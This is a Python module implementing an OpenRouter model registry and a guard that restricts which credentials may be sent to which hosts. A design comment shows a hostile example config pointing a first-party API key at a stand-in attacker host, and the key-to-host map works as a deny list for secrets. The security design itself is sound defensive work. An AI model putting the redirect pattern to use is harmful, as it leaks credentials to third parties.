"""Config-driven OpenRouter model registry.

Every other model in the fleet costs six code edits to add — the dropdown,
``get_llm``, ``MODEL_CAPABILITIES``, ``_KNOWN_MODELS``, the api-key map and the
label map (``test_model_registry_consistency`` exists to make missing one a red
build). That is the right shape for a model with its own client, its own quirks
and its own reasons to exist.

It is the wrong shape for OpenRouter. OpenRouter is one OpenAI-compatible
endpoint in front of hundreds of models and, for each model, dozens of *provider
endpoints* that differ only in price, quantization and throughput —
``deepseek/deepseek-v4-flash-0731`` alone is served by 28 of them. Trying one is
a pricing experiment, not a code change, so they live in config instead:

    {
      "models": {
        "deepseek-flash-0731-relace": {
          "label": "DeepSeek V4 Flash 0731 (Relace fp4)",
          "short_label": "DS 0731 Relace",
          "model": "deepseek/deepseek-v4-flash-0731",
          "provider": {"order": ["relace/fp4"], "allow_fallbacks": false},
          "capabilities": {"images": false, "video": false, "pdf": false}
        }
      }
    }

Adding an endpoint is that block. The registry feeds ``get_llm``, the capability
table, the policy's known-models list, the api-key map and the dropdown, so a
registered model is fully wired the moment the file is read.

**Layering** mirrors :mod:`app.lib.langgraph_registry`: a platform base compiled
in below, then a host-mounted client overlay that survives container recreates.
Overlay entries win on a name collision, so a box can re-point or re-price a
built-in entry without a rebuild.

**Ownership and trust.** The overlay is OPERATOR-owned, exactly like
``instance.json`` and ``ENABLED_MODELS`` — it is mounted from the host, and no
agent tool writes to it (the AI-builder's write target is ``langgraph.local.json``
specifically). That is what lets a registered model be *enabled* by default:
requiring the operator to also name it in ``ENABLED_MODELS`` would mean
configuring the same intent twice, which is the friction this file removes. An
explicit ``DISABLED_MODELS`` entry still wins, and ``"enabled": false`` turns one
off in place.

**Fail-open everywhere**: a missing, unreadable or malformed overlay is logged
and skipped. A broken config file must never take the dropdown down.
"""
from __future__ import annotations

import json
import logging
import os
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse

logger = logging.getLogger(__name__)

# Rejections already reported, so one bad entry is one log line and not one per
# read. The registry is read fresh on EVERY call (get_llm, the availability
# endpoint, policy, capabilities), which is ~46 reads per turn — a single
# malformed pushed entry would otherwise emit thousands of identical lines a
# minute on every box in the fleet, which is how a config mistake becomes an
# incident of its own. Keyed on the full rejection so a CHANGED entry is
# reported again; bounded by the number of distinct bad entries.
_reported_rejections: set = set()


def _report_once(key: tuple, level, msg: str, *args) -> None:
    if key in _reported_rejections:
        return
    _reported_rejections.add(key)
    level(msg, *args)

# The OpenAI-compatible endpoint. Overridable for a proxy/mock in tests.
DEFAULT_API_BASE = "https://openrouter.ai/api/v1"
API_BASE_ENV = "OPENROUTER_BASE_URL"

# One key for every entry — that is the point of routing through OpenRouter.
API_KEY_ENV = "OPENROUTER_API_KEY"

# Host-mounted client overlay. Sits beside instance.json in the .leonardo mount so
# it survives a container recreate and stays off the platform sync allowlist.
OVERLAY_PATH_ENV = "OPENROUTER_MODELS_CONFIG"
DEFAULT_OVERLAY_PATH = ".leonardo/openrouter_models.json"

# Capability defaults for an entry that declares none. Text-only on purpose —
# the opposite of get_model_capabilities' permissive unknown-model default,
# because here we are reading a config file the operator just wrote: guessing
# "probably multimodal" would offer an image upload that 400s at the provider.
_DEFAULT_CAPABILITIES = {"images": False, "video": False, "pdf": False}

# Compiled-in base entries. Deliberately small: endpoints we have actually
# smoke-tested (tool calling + reasoning + streaming through the pin), not a
# catalogue of the 28 that exist. Everything else belongs in the overlay.
#
# Both cost nothing on a box without an OPENROUTER_API_KEY: policy step 2b gates
# registration on the key, so a fleet box never grows a dropdown option it
# cannot run.
_BASE_MODELS = {
    "deepseek-flash-0731-relace": {
        "label": "DeepSeek V4 Flash 0731 (Relace fp4)",
        "short_label": "DS 0731 Relace",
        "model": "deepseek/deepseek-v4-flash-0731",
        # Pin ONE provider endpoint with fallbacks off. Without this, OpenRouter
        # load-balances across all 28 endpoints for this model, and the whole
        # reason to pick relace/fp4 ($0.04/$0.08 per M, vs $0.22/$0.66 at
        # DeepSeek direct) evaporates on the first silent reroute. It also keeps
        # prompt caching meaningful: cache hit rate is per-replica, so a request
        # that lands on a different provider each turn caches nothing.
        #
        # allow_fallbacks:false means a Relace outage is a FAILED TURN, not a
        # silent switch to a pricier endpoint. That is the intended trade —
        # flip it to true in the overlay if a box would rather pay than fail.
        "provider": {"order": ["relace/fp4"], "allow_fallbacks": False},
        "capabilities": {"images": False, "video": False, "pdf": False},
    },
    "deepseek-flash-0731-digitalocean": {
        "label": "DeepSeek V4 Flash 0731 (DigitalOcean)",
        "short_label": "DS 0731 DO",
        "model": "deepseek/deepseek-v4-flash-0731",
        # Same weights as the Relace entry above, different host. Costs more
        # ($0.08/$0.252 per M vs $0.04/$0.08) and buys two things:
        #
        #   * Uptime. 99.06% vs 97.94% over the last day when this was added.
        #     With allow_fallbacks off, a provider's downtime is our failed turn.
        #   * A named US host. Routing already adds OpenRouter as a processor;
        #     DigitalOcean is at least a jurisdiction we can point at, which is
        #     the same reasoning that moved deepseek-v4-flash to Fireworks.
        #
        # !! TOOL CALLING IS UNRELIABLE HERE — do not point a Leo box at this
        # without re-measuring. A single probe passes (it returns a valid
        # tool_call), which is exactly why this needs the warning: the problem
        # only shows up at volume. Measured against the real 22.8k-token
        # RAILS_AGENT_PROMPT with the real tool set, 2026-08-26:
        #
        #   * invented tool names that were never bound — `Read`,
        #     `exec_command`, `list_files`, `exec` — in 4 of 9 sequential turns,
        #   * one turn emitted its raw tool-call template as PLAIN TEXT
        #     (`<|DSML|...:invoke name="grep">`) instead of a structured call,
        #     which points at a broken tool-call parser on the serving side —
        #     the same class of defect as a vLLM missing --tool-call-parser,
        #   * ~9s/turn, vs 1.6s on the Relace entry above.
        #
        # By contrast the fp4 Relace entry scored 12/12 correct tool choice with
        # zero invented names, so this is NOT a quantization story — quantization
        # is unreported here and fp4 there. It is how this host serves the model.
        #
        # Kept registered because an operator asked for it and it is a valid
        # choice for non-tool-calling use; flip "enabled": false in the overlay,
        # or DISABLED_MODELS, to take it off the dropdown.
        #
        # Quantization is reported "unknown", which is NOT a claim of higher
        # precision — 10 of this model's 29 endpoints report "unknown",
        # DeepSeek's own first-party endpoint and Fireworks among them. It may
        # well be fp4 like Relace. The field is unreported metadata, so it is not
        # a reason to prefer this endpoint; judge both on behavior.
        "provider": {"order": ["digitalocean"], "allow_fallbacks": False},
        "capabilities": {"images": False, "video": False, "pdf": False},
    },
    "glm-5.3-flash-zai": {
        "label": "GLM 5.3 Flash (Z.AI fp8)",
        "short_label": "GLM 5.3F",
        "model": "z-ai/glm-5.3-flash",
        # First non-DeepSeek endpoint to earn a compiled-in slot, and the first
        # to match Relace on the measurement that actually matters. Probed
        # 2026-08-27 against the real 22.8k-token RAILS_AGENT_PROMPT with the
        # real tool set, 12 turns:
        #
        #   * 12/12 correct tool choice, 0 invented tool names, 0 raw-template
        #     leaks, 12/12 well-formed args, 12/12 second hops. (One second hop
        #     returned empty on a first run and not on a re-run — a flake, not a
        #     pattern, but it is the only blemish in 24 observed.)
        #   * reasoning_content populated on all 12; streams as deltas.
        #   * ~7s/turn. That is the trade — Relace is 1.6s. It is a reasoning
        #     model and the time is thinking, not a sick endpoint, but a latency-
        #     sensitive box should still prefer Relace.
        #
        # Prompt caching is the reason to want this one: 22,208 of 22,250 input
        # tokens came back as cache reads, at $0.015/M cached vs $0.075/M fresh.
        # Per-replica as always, which is what the provider pin protects.
        #
        # Pinned to Z.AI's own fp8 endpoint at the operator's explicit choice.
        # Note what that means: this is a first-party CHINESE host, and the move
        # of deepseek-v4-flash to Fireworks was made on jurisdiction grounds.
        # US-hosted alternatives for the same weights exist at 2x the token price
        # (baseten/fp8 and cloudflare, both $0.15/$0.50, 100%/99.9% uptime) —
        # swap the `order` below in the overlay to move without a rebuild.
        "provider": {"order": ["z-ai/fp8"], "allow_fallbacks": False},
        # images: MEASURED, not read off the model card — a 256x256 PNG is
        # described correctly through the pin, via data-URL or bare base64.
        # Beware the probe trap: an 8x8 PNG is rejected with `400 code 1210
        # 图片输入格式/解析错误`, which reads exactly like "no vision path".
        # video: the model card claims it; untested here, so it stays off.
        "capabilities": {"images": True, "video": False, "pdf": False},
    },
}


# Credentials we know about, each mapped to the host(s) it legitimately belongs
# to. An empty set means the key is never a model credential at any host.
#
# This map is a CONVENIENCE, not the boundary. The boundary is
# :func:`_key_env_allowed_at`, which defaults to deny for any key THIS BOX
# HOLDS. That distinction is the whole correction: the first cut of this guard
# allowed any unnamed key at any host, so the shortest possible entry — a model
# id and an api_base, no api_key_env, falling through to the default
# OPENROUTER_API_KEY — shipped the fleet's OpenRouter key wherever it pointed.
#
# Enumerating names was never going to hold. Read live off llamapress-dev the
# same day the map was written, it was already missing OPENROUTER_API_KEY,
# OPENROUTER_MANAGEMENT_API_KEY, BEDROCK_API_KEY, GMI_DEEPSEEK_API_KEY,
# GROUND_ROUTE_SEARCH_API_KEY, TAVILY_API_KEY and LLAMAPRESS_AI_LOGIN_SECRET —
# and the mothership's provisioner writes a SHARED_<NAME> twin of each. A list
# that has to keep up with every secret anyone ever adds to a box is a list that
# is wrong by the next provisioning change. "Does this box hold it" needs no
# list and cannot drift.
#
# This is the escalation the 0.7.7 remote-registry work opens, and the guard
# that closes it. A pushed policy already decides which model a box runs — that
# is the point of it. But `{"api_base": "https://evil.example/v1",
# "api_key_env": "ANTHROPIC_API_KEY"}` is a different kind of power: it sends a
# first-party credential to an arbitrary host. Note what is NOT refused:
#
#   * naming a brand-new provider's key (`NEW_PROVIDER_API_KEY`) with any host —
#     the box does not hold it, so it 401s honestly until an operator adds it,
#     and this is the case the whole feature exists for;
#   * naming a first-party key at its OWN host — that is how a hand-written
#     branch becomes config (`api.meta.ai` + META_API_KEY is exactly the Muse
#     entry), which is the point of generalizing the registry at all.
#
# Only the pairing "our secret, somewhere else" is refused, and it is refused by
# dropping the whole entry rather than by silently blanking the key, so the
# failure is one loud log line instead of a model that mysteriously 401s.
#
# Hosts are matched exactly on the parsed hostname, so a lookalike
# (`api.meta.ai.evil.example`) does not pass — a prefix/suffix check would be
# the classic hole here.
_FIRST_PARTY_KEY_HOSTS = {
    "OPENAI_API_KEY": frozenset({"api.openai.com"}),
    "ANTHROPIC_API_KEY": frozenset({"api.anthropic.com"}),
    "GOOGLE_API_KEY": frozenset({"generativelanguage.googleapis.com"}),
    "GEMINI_API_KEY": frozenset({"generativelanguage.googleapis.com"}),
    "DEEPSEEK_API_KEY": frozenset({"api.deepseek.com"}),
    "META_API_KEY": frozenset({"api.meta.ai"}),
    "MODEL_API_KEY": frozenset({"api.meta.ai"}),
    "ALIBABA_API_KEY": frozenset({
        "dashscope-us.aliyuncs.com",
        "dashscope-intl.aliyuncs.com",
        "dashscope.aliyuncs.com",
    }),
    "DASHSCOPE_API_KEY": frozenset({
        "dashscope-us.aliyuncs.com",
        "dashscope-intl.aliyuncs.com",
        "dashscope.aliyuncs.com",
    }),
    "FIREWORKS_API_KEY": frozenset({"api.fireworks.ai"}),
    "FIREWORKS_DEEPSEEK_API_KEY": frozenset({"api.fireworks.ai"}),
    "GMI_API_KEY": frozenset({"api.gmi-serving.com"}),
    "HETZNER_API_KEY": frozenset({"inference.hetzner.com"}),
    # The DEFAULT api_key_env, and so the one an entry gets by writing nothing.
    "OPENROUTER_API_KEY": frozenset({"openrouter.ai"}),
    # Not model credentials at any host. Case 2 would already refuse these on a
    # box that holds them; naming them here refuses them even on a box that does
    # not, and makes them unreachable through an operator `key_hosts` override —
    # an operator declaring a host for the mothership token is a mistake, not an
    # intent.
    "TAVILY_API_KEY": frozenset(),
    "OPENROUTER_MANAGEMENT_API_KEY": frozenset(),
    "LLAMAPRESS_AI_LOGIN_SECRET": frozenset(),
    "MOTHERSHIP_API_TOKEN": frozenset(),
    "SECRET_KEY_BASE": frozenset(),
    "SESSION_SECRET": frozenset(),
    "AUTH_DB_URI": frozenset(),
    "DB_URI": frozenset(),
}


#: The mothership provisioner writes every secret twice — ``NAME`` and
#: ``SHARED_NAME``. Two map entries would drift apart; stripping the prefix
#: before the lookup cannot.
_SHARED_PREFIX = "SHARED_"


def _canonical_key_env(key_env: str) -> str:
    """``SHARED_META_API_KEY`` -> ``META_API_KEY``. Anything else unchanged."""
    if key_env.startswith(_SHARED_PREFIX):
        return key_env[len(_SHARED_PREFIX):]
    return key_env


def _host_of(endpoint: str) -> str:
    try:
        return (urlparse(endpoint).hostname or "").lower()
    except ValueError:
        return ""


def _key_env_allowed_at(key_env: str, endpoint: str) -> tuple:
    """Whether ``key_env`` may be sent to ``endpoint``, and why not if not.

    Returns ``(allowed, reason)`` — the reason is for the log line, because
    "declare its host in the overlay" and "that key never goes anywhere" are
    very different next actions for the operator reading it.

    Three cases, in order:

      1. **A key we know about** — the host must be one of the key's own. An
         empty set means the key is not a model credential anywhere.
      2. **A key we do not know about, but THIS BOX HOLDS** — refused, unless
         the host-mounted operator overlay declares a host for it. Putting the
         key on the box is already an on-box operator action, so the operator's
         own file is where "and it may go here" belongs. A pushed document must
         never be able to declare this: a document that grants itself trust is
         not a boundary. (:func:`_read_pushed` never reads ``key_hosts``, and
         ``model_policy_store._ALLOWED_KEYS`` drops it before it is even stored.)
      3. **A key we do not know about and the box does NOT hold** — allowed
         anywhere. This is staging a provider ahead of its credential, and
         nothing can leak: there is no value under that name, so the request
         401s honestly. The moment an operator adds the key, case 2 takes over.
    """
    canonical = _canonical_key_env(key_env)
    host = _host_of(endpoint)

    known = _FIRST_PARTY_KEY_HOSTS.get(canonical)
    if known is not None:
        if canonical == API_KEY_ENV:
            # Wherever the OPERATOR pointed the default endpoint counts as this
            # key's home too. OPENROUTER_BASE_URL exists so a box can sit behind
            # a proxy (or a test behind a double), and that is an on-box env
            # change — the same authority as putting the key there in the first
            # place. Not a hole: it widens ONE key to ONE operator-set host, and
            # a pushed entry still cannot name any other.
            known = known | {_host_of(api_base())}
        if host in known:
            return True, ""
        if not known:
            return False, f"{canonical} is not a model credential at any host"
        return False, (
            f"{canonical} belongs to {', '.join(sorted(known))}, not to {host or endpoint!r}"
        )

    if not os.getenv(key_env, "").strip() and not os.getenv(canonical, "").strip():
        return True, ""

    declared = _overlay_key_hosts().get(canonical)
    if declared and host in declared:
        return True, ""
    if declared:
        return False, (
            f"the overlay declares {canonical} for {', '.join(sorted(declared))}, "
            f"not for {host or endpoint!r}"
        )
    return False, (
        f"this box holds {key_env} and no host is declared for it; add "
        f'\'"key_hosts": {{"{canonical}": ["{host}"]}}\' to the operator overlay '
        "if that endpoint is really where it belongs"
    )


def _overlay_path() -> Path:
    """Where the client overlay lives. Returned whether or not it exists."""
    explicit = os.getenv(OVERLAY_PATH_ENV)
    if explicit:
        return Path(explicit).expanduser()
    return Path(DEFAULT_OVERLAY_PATH)


def _read_overlay_doc() -> dict:
    """The whole overlay document. Fail-open to ``{}`` on any problem."""
    path = _overlay_path()
    try:
        with path.open("r", encoding="utf-8") as f:
            data = json.load(f)
    except FileNotFoundError:
        return {}
    except (json.JSONDecodeError, OSError) as e:
        logger.warning("Could not read model registry overlay %s: %s", path, e)
        return {}
    return data if isinstance(data, dict) else {}


def _overlay_key_hosts() -> dict:
    """``{KEY_ENV: {host, ...}}`` declared by the OPERATOR overlay.

    Where an operator says "this box holds MOONSHOT_API_KEY, and api.moonshot.ai
    is where it may go". Only this file — never the pushed document, which would
    then be granting itself the trust the guard exists to withhold.

    Keys are canonicalised (``SHARED_`` stripped) so a declaration cannot be
    dodged by naming the twin, and a key in :data:`_FIRST_PARTY_KEY_HOSTS` is
    NOT overridable here: those are either already correct or deliberately
    empty, and letting a local file widen them would reopen the hole for
    anything that can write that file.
    """
    raw = _read_overlay_doc().get("key_hosts")
    if not isinstance(raw, dict):
        if raw is not None:
            logger.warning("Model registry overlay: 'key_hosts' is not an object; ignoring")
        return {}

    declared = {}
    for key_env, hosts in raw.items():
        if not isinstance(key_env, str) or not key_env.strip():
            continue
        canonical = _canonical_key_env(key_env.strip())
        if canonical in _FIRST_PARTY_KEY_HOSTS:
            logger.warning(
                "Model registry overlay: 'key_hosts' may not redeclare %s; ignoring "
                "that entry (known credentials keep their compiled-in hosts)",
                canonical,
            )
            continue
        if isinstance(hosts, str):
            hosts = [hosts]
        if not isinstance(hosts, (list, tuple)):
            continue
        clean = {_host_of(h) or str(h).strip().lower() for h in hosts if isinstance(h, str) and h.strip()}
        if clean:
            declared[canonical] = clean
    return declared


def _read_overlay() -> dict:
    """Read the overlay's ``models`` map. Fail-open to ``{}`` on any problem."""
    path = _overlay_path()
    data = _read_overlay_doc()
    models = data.get("models") if isinstance(data, dict) else None
    if not isinstance(models, dict):
        if models is not None:
            logger.warning("%s: 'models' is not an object; ignoring overlay", path)
        return {}
    return models


def _normalize(name: str, raw: dict) -> Optional[dict]:
    """Validate one entry and fill in its defaults, or None if unusable.

    The only hard requirement is ``model`` — the OpenRouter model id. An entry
    without one cannot build a client, and silently registering it would put a
    dead option in the dropdown, so it is dropped loudly instead.
    """
    if not isinstance(raw, dict):
        logger.warning("OpenRouter entry %r is not an object; skipping", name)
        return None

    model_id = raw.get("model")
    if not isinstance(model_id, str) or not model_id.strip():
        logger.warning(
            "OpenRouter entry %r has no 'model' (the OpenRouter model id); skipping", name
        )
        return None

    caps = raw.get("capabilities")
    capabilities = dict(_DEFAULT_CAPABILITIES)
    if isinstance(caps, dict):
        # Only the three keys the rest of the app knows how to act on, coerced to
        # bool so a JSON string can't make `if caps['images']` accidentally true.
        for key in _DEFAULT_CAPABILITIES:
            if key in caps:
                capabilities[key] = bool(caps[key])

    # The endpoint and the credential. Defaulting both to OpenRouter is what
    # keeps every pre-0.7.7 entry working untouched: those entries describe a
    # model, not a gateway, because there was only ever one gateway.
    #
    # `api_base` present makes this a generic OpenAI-compatible endpoint entry,
    # which is the shape of 10 of get_llm's 24 hand-written branches (Muse 1.2
    # and 1.3, Hetzner Qwen, the three RunPod pods, GMI, both Fireworks entries).
    # Those differ from each other in exactly these fields plus `extra_body` and
    # `reasoning` — which is why they can be config rather than a release.
    api_base_raw = raw.get("api_base", raw.get("base_url"))
    if api_base_raw is None:
        endpoint = None
    elif isinstance(api_base_raw, str) and api_base_raw.strip():
        endpoint = api_base_raw.strip()
    else:
        # Fail-open on the FILE, fail-closed on the ENTRY: an unusable endpoint
        # would be handed to a real client, so drop the entry and keep the rest.
        logger.warning(
            "Model registry entry %r has a non-string 'api_base' (%r); skipping",
            name, api_base_raw,
        )
        return None

    key_env_raw = raw.get("api_key_env")
    if key_env_raw is None:
        key_envs = (API_KEY_ENV,)
    elif isinstance(key_env_raw, str) and key_env_raw.strip():
        key_envs = (key_env_raw.strip(),)
    elif isinstance(key_env_raw, (list, tuple)) and all(
        isinstance(v, str) and v.strip() for v in key_env_raw
    ) and key_env_raw:
        # A list, because one provider can go by two names — Meta's docs say
        # MODEL_API_KEY while their LiteLLM integration says META_API_KEY, and
        # the hand-written branch accepts either. First found wins, matching
        # llm_factory.provider_key.
        key_envs = tuple(v.strip() for v in key_env_raw)
    else:
        logger.warning(
            "Model registry entry %r has an unusable 'api_key_env' (%r); skipping",
            name, key_env_raw,
        )
        return None

    effective_endpoint = endpoint or api_base()
    refusals = []
    for var in key_envs:
        ok, why = _key_env_allowed_at(var, effective_endpoint)
        if not ok:
            refusals.append(why)
    if refusals:
        _report_once(
            (name, effective_endpoint, tuple(key_envs)),
            logger.error,
            "Model registry entry %r points api_base at %s but may not send the "
            "credential(s) it names there; refusing to register it. %s",
            name, effective_endpoint, " / ".join(refusals),
        )
        return None

    entry = {
        "model": model_id.strip(),
        # Resolved here, not at build time, so every consumer (get_llm, the
        # availability endpoint, policy) reads one already-decided value. An
        # entry that names none gets OpenRouter's, which OPENROUTER_BASE_URL
        # still re-points — the registry is read fresh on every call.
        "api_base": endpoint or api_base(),
        "api_key_env": key_envs,
        "label": str(raw.get("label") or name),
        "short_label": str(raw.get("short_label") or raw.get("label") or name),
        "capabilities": capabilities,
        # Whether this entry is offered at all. Lets an operator park a config
        # block (keeping the pricing notes) without it reaching the dropdown.
        "enabled": raw.get("enabled", True) is not False,
        # OpenRouter's thinking normalization differs from DeepSeek's own API, so
        # which client to build stays per-entry rather than sniffed from the id.
        # Default True: every model worth pinning an endpoint for today is a
        # reasoning model, and the reasoning-aware client is a superset.
        "reasoning": raw.get("reasoning", True) is not False,
    }

    # Provider routing (pin an endpoint / quantization) and any other top-level
    # OpenRouter request field. Merged into one extra_body, entry-provided
    # extra_body first so `provider` stays authoritative for the common case.
    extra_body = {}
    raw_extra = raw.get("extra_body")
    if isinstance(raw_extra, dict):
        extra_body.update(raw_extra)
    provider = raw.get("provider")
    if isinstance(provider, dict):
        extra_body["provider"] = provider
    if extra_body:
        entry["extra_body"] = extra_body

    return entry


def _read_pushed() -> dict:
    """The ``models`` map from the mothership's pushed policy document (0.7.7).

    The third source, and the one the generalization exists for: an entry here
    reaches every box on the next lease tick, so adding a model fleet-wide stops
    being a release. Same validation as the other two — a pushed entry is
    untrusted input like the rest of that document, and the key/host guard in
    :func:`_normalize` is what keeps "the mothership picks our models" from
    also meaning "the mothership can address our secrets anywhere".

    Fail-open to ``{}``: a policy document with no ``models`` key is the normal
    case today, and a malformed one must not take the dropdown down.
    """
    try:
        from app.services import model_policy_store

        models = model_policy_store.load().get("models")
    except Exception as e:  # never let a config read break the dropdown
        logger.warning("Could not read pushed model registry: %s", e)
        return {}
    if not isinstance(models, dict):
        if models is not None:
            logger.warning("Pushed policy: 'models' is not an object; ignoring")
        return {}
    return models


def openrouter_models() -> dict:
    """The merged, validated registry: ``{frontend_name: entry}``.

    Three sources, later wins on a name collision:

      1. compiled-in base entries,
      2. the host-mounted operator overlay,
      3. the mothership's pushed policy document (0.7.7).

    The mothership going last matches how ``model_policy.json`` already outranks
    ``instance.json``: on a fleet box the mothership is the operator of record,
    and a stale hand-edit left over from the last incident must not make the next
    remote fix a silent no-op. A box that wants the opposite is a box that should
    not be taking a pushed policy at all.

    Read fresh each call — both files are edited live (one by an operator, one by
    the lease tick), and caching would mean a container restart to try a
    different endpoint.
    """
    merged: dict = {}
    for source in (_BASE_MODELS, _read_overlay(), _read_pushed()):
        for name, raw in source.items():
            if not isinstance(name, str) or not name.strip():
                continue
            entry = _normalize(name.strip(), raw)
            if entry is not None:
                merged[name.strip()] = entry
    return {name: e for name, e in merged.items() if e["enabled"]}


def get_openrouter_model(name: str) -> Optional[dict]:
    """The registry entry for ``name``, or None if it isn't an OpenRouter model."""
    return openrouter_models().get(name)


def is_openrouter_model(name: str) -> bool:
    """True if ``name`` is served through OpenRouter (so get_llm must route it)."""
    return name in openrouter_models()


def api_base() -> str:
    """The OpenAI-compatible base URL, overridable for a proxy or a test double."""
    return os.getenv(API_BASE_ENV) or DEFAULT_API_BASE
